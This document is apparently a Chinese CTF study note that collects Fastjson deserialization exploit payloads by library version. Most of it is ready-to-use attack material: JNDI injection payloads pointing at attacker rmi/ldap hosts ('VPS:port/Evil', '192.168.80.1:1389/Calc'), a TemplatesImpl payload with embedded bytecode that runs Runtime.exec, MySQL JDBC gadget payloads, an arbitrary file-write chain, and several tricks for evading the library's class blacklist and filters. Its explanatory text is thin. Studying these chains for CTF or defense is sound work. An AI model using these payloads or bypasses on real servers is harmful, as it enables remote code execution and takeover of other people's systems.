## 文章

[Java安全学习——Fastjson反序列化漏洞 - 枫のBlog](F:\LocalCTF\JAVA学习\Java安全学习——Fastjson反序列化漏洞 - 枫のBlog.html)

## Fastjson 验证Pyaload

```json
{"@type":"java.net.Inet4Address","val":"fvnp2k.dnslog.cn"}
```

## Fastjson <= 1.2.24

#### JdbcRowSetImpl利用链

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}

{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://127.0.0.1:1099/badClassName", "autoCommit":true}
```

**调用栈**

```java
connect:627, JdbcRowSetImpl (com.sun.rowset)
setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
main:10, Fastjson_Jdbc_LDAP
```

#### TemplatesImpl利用链

Fastjson通过`bytecodes`字段传入恶意类，调用`outputProperties`属性的getter方法时，实例化传入的恶意类，调用其构造方法，造成任意命令执行。

其实`TemplatesImpl`这条链在我们构造CC3的时候已经利用过了，原因是`TemplatesImpl#getTransletInstance`中调用了`defineClass()`进行动态类加载，而其中的构造参数我们容易控制，这就造成了一些反序列化漏洞。

但该链的利用面较窄，由于payload需要赋值的一些属性为`private`类型，需要在`parse()`反序列化时设置第二个参数`Feature.SupportNonPublicField`，服务端才能从JSON中恢复`private`类型的属性。

```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="],'_name':'a.b','_tfactory':{ },"_outputProperties":{ }}
```

恶意类

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
import java.io.IOException;
 
public class Payload extends AbstractTranslet {
 
    public Payload() throws IOException{
        Runtime.getRuntime().exec("calc");
    }
 
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
 
    }
 
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
 
    }
 
    public static void main(String[] args) throws IOException {
        Payload payload = new Payload();
    }
}
```

## Fastjson高版本绕过

### 1.2.25-1.2.41绕过

版本1.2.25之后添加了`AutoTypeSupport`参数，默认为`false`，为白名单, 白名单一般空，比较难绕过

将`AutoTypeSupport`转为`true` ，转变为黑名单

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 
```

黑名单

```java
bsh,
com.mchange,com.sun.,
java.lang.Thread,java.net.Socket,
java.rmi,
javax.xml,
org.apache.bcel,
org.apache.commons.beanutils,
org.apache.commons.collections.Transformer,
org.apache.commons.collections.functors,
org.apache.commons.collections4.comparators,
org.apache.commons.fileupload,
org.apache.myfaces.context.servlet,
org.apache.tomcat,
org.apache.wicket.util,
org.codehaus.groovy.runtime,
org.hibernate,
org.jboss,
org.mozilla.javascript,
org.python.core,
org.springframework
```

在`TypeUtils#loadClass`内，会移除`L`和`;`

```java
    public static Class<?> loadClass(String className, ClassLoader classLoader) {
        if (className == null || className.length() == 0) {
            return null;
        }

        Class<?> clazz = mappings.get(className);

        if (clazz != null) {
            return clazz;
        }

        if (className.charAt(0) == '[') {
            Class<?> componentType = loadClass(className.substring(1), classLoader);
            return Array.newInstance(componentType, 0).getClass();
        }

        if (className.startsWith("L") && className.endsWith(";")) {
            String newClassName = className.substring(1, className.length() - 1);
            return loadClass(newClassName, classLoader);
        }
```

所以可以通过加 `L` 和 `;` 绕过

```java
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;", "dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
```

### 1.2.42绕过

1.2.42相较于之前的版本，关键是在`ParserConfig.java`中修改了以下两点

- 黑名单改为了hash值，防止绕过
- 对于传入的类名，删除开头`L`和结尾的`;`

```java
        final long BASIC = 0xcbf29ce484222325L;
        final long PRIME = 0x100000001b3L;

        if ((((BASIC
                ^ className.charAt(0))
                * PRIME)
                ^ className.charAt(className.length() - 1))
                * PRIME == 0x9198507b5af98f0L)
        {
            className = className.substring(1, className.length() - 1);
        }
```

但只删除一次开头`L`和结尾的`;`

所以可以双写绕过,修得有点搞笑了hh

```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
```

### 1.2.43版本绕过

1.2.43版本修改了`checkAutoType()`的部分代码，对于LL等开头结尾的字符串直接抛出异常。

```java
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
 
                className = className.substring(1, className.length() - 1);
            }
```

我们可以通过`[{`绕过，Payload如下

```json
{
    "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
    "dataSourceName":"ldap://localhost:1399/Exploit", 
    "autoCommit":true
}
```

首先在恶意类前添加`[`，变成`"[com.sun.rowset.JdbcRowSetImpl"`，会报错

```
Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,, pos 42, json : {"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:9999/EXP", "autoCommit":true}
```

根据提示在逗号前添加`[`，变成`"[com.sun.rowset.JdbcRowSetImpl"[`，仍报错

```
Exception in thread "main" com.alibaba.fastjson.JSONException: syntax error, expect {, actual string, pos 43, fastjson-version 1.2.43
```

继续在逗号前添加{，变成 `"[com.sun.rowset.JdbcRowSetImpl"[{`，成功执行

### 1.2.44修复

修复了对`[` 的限制

### 1.2.45绕过

1.2.45版本添加了一些黑名单，但是存在组件漏洞，我们能通过mybatis组件进行JNDI接口调用，进而加载恶意类。

首先引入依赖

```xml
<dependency>
        <groupId>org.mybatis</groupId>
        <artifactId>mybatis</artifactId>
        <version>3.5.6</version>
</dependency>
```

Payload如下

```json
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"rmi://127.0.0.1:1099/Exp"
    }
}
```

### 1.2.47通杀绕过

该版本Payload能够绕过`checkAutoType`内的各种检测，原理是通过Fastjson自带的缓存机制将恶意类加载到`Mapping`中，从而绕过`checkAutoType`检测。

也不需要将`checkAutoType`设为`true` 

**Payload**

```json
{
     "1":{
               "@type":"java.lang.Class",
           "val":"com.sun.rowset.JdbcRowSetImpl"
         },
          
     "2":{    
           "@type":"com.sun.rowset.JdbcRowSetImpl",
           "dataSourceName":"ldap://127.0.0.1:9999/EXP",
           "autoCommit":"true"
         }
}
```

### Fastjson <= 1.2.61

[fastjson 1.2.61远程代码执行漏洞分析&复现 - Curz0n's Blog](F:\LocalCTF\fastjson 1.2.61远程代码执行漏洞分析&复现 - Curz0n's Blog.html)

```json
{"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"rmi://127.0.0.1:1099/Exploit-SERVER"}
```



### Fastjson <=1.2.62

```bash
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://VPS:port/Evil"}";
```

由于存在`jndi,rmi,ldap,\x`的过滤，需要用`unicode`编码绕过。

```javascript
str=xxxxxxxx&input={"@type":"org.apache.xbean.propertyeditor.\u004a\u006e\u0064\u0069Converter","AsText":"\u006c\u0064\u0061\u0070://VPS:port/Evil"}
```

利用换行`%0a`绕过`Pattern.compile`。

```javascript
str=xxxxxxxx&input={"@type":"org.apache.xbean.propertyeditor.\u004a\u006e\u0064\u0069Converter","AsText":"%0aldap://VPS:port/Evil"}
```

### fastjson <= 1.2.66

`autoTypeSupport`属性为`true`

```json
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1399/Calc"}}
```



### Fastjson  <= 1.2.68

**JDBC4Connection**

```bash
{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.jdbc.JDBC4Connection",
	"hostToConnectTo": "172.20.64.40",
	"portToConnectTo": 3306,
	"url": "jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
	"databaseToConnectTo": "test",
	"info": {
		"@type": "java.util.Properties",
		"PORT": "3306",
		"statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
		"autoDeserialize": "true",
		"user": "yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn",
		"PORT.1": "3306",
		"HOST.1": "172.20.64.40",
		"NUM_HOSTS": "1",
		"HOST": "172.20.64.40",
		"DBNAME": "test"
	}
}
```

**ReplicationMySQLConnection**

```bash
{
       "@type":"java.lang.AutoCloseable",
       "@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
       "proxy": {
              "@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
              "connectionUrl":{
                     "@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",
                     "masters":[{
                            "host":""
                     }],
                     "slaves":[],
                     "properties":{
                            "host":"127.0.0.1",
                            "port":"3306",          
                            "user":"yso_CommonsCollections4_calc",
                            "dbname":"dbname",
                            "password":"pass",
                            "queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                            "autoDeserialize":"true"
                     }
              }
       }
}
```

**AutoCloseable 任意文件写入**

[fastjson v1.2.68 RCE利用链复现](F:\LocalCTF\fastjson v1.2.68 RCE利用链复现.pdf)

```bash
{
	"@type": "java.lang.AutoCloseable",
	"@type": "org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream",
	"out": {
		"@type": "java.io.FileOutputStream",
		"file": "/path/to/target"
	},
	"parameters": {
		"@type": "org.apache.commons.compress.compressors.gzip.GzipParameters",
		"filename": "filecontent"
	}
}
```



## 小Trick

当存在反序列化漏洞并以toString为入口时，通过Fastjson的`com.alibaba.fastjson.JSONObject.toString`方法可以调用任意类的getter方法，因此可以配合TemplatesImpl进行RCE。具体Gadget如下

```java
...能够调用任意类的toString()方法
* com.alibaba.fastjson.JSONObject.toString()
* com.alibaba.fastjson.JSON.toString()
* com.alibaba.fastjson.JSON.toJSONString()
* com.alibaba.fastjson.serializer.MapSerializer.write()
* TemplatesImpl.getOutputProperties()
...TemplatesImpl的调用过程
```

#### 例题

[西湖论剑2022\] easy_api](https://www.ctfer.vip/problem/3430)

#### Fastjson 原生反序列化链

[FastJson与原生反序列化(二) _ Y4tacker's Blog](F:\LocalCTF\JAVA学习\FastJson与原生反序列化(二) _ Y4tacker's Blog.html)

[FastJson与原生反序列化 _ Y4tacker's Blog](F:\LocalCTF\JAVA学习\FastJson与原生反序列化 _ Y4tacker's Blog.html)

## Fastjson 绕WAF

[浅谈Fastjson绕waf _ Y4tacker's Blog](F:\LocalCTF\JAVA学习\浅谈Fastjson绕waf _ Y4tacker's Blog.html)

## Fastjson 不出网利用总结

[Fastjosn不出网利用总结](F:\LocalCTF\JAVA学习\Fastjosn不出网利用总结.pdf)
